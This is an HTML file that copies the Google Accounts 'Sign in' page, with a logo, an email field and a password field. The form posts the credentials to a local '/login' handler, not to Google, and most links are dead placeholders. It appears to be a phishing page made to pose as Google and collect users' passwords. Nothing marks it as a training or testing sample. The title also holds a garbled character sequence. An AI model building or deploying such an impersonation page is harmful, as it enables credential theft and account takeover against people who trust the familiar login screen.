<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in â€“ Google Accounts</title>
  <link href="font" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img src="googlelogo_color_92x30dp.png" alt="Google Logo">
      <h1>Sign in</h1>
      <p>with your Google Account</p>
      <form action="/login" method="post">
        <input type="text" name="username" placeholder="Email or phone" required>
        <input type="password" name="password" placeholder="Password" required>
        <div class="links">
          <a href="#">Forgot email?</a>
        </div>
        <p class="small-text">Not your computer? Use a Private Window to sign in. <a href="#">Learn more</a></p>
        <div class="buttons">
          <a href="#">Create account</a>
          <input type="submit" value="Next">
        </div>
      </form>
    </div>
    <div class="footer">
      <span>English (United States)</span>
      <div class="footer-links">
      
      </div>
    </div>
  </div>
</body>
</html>
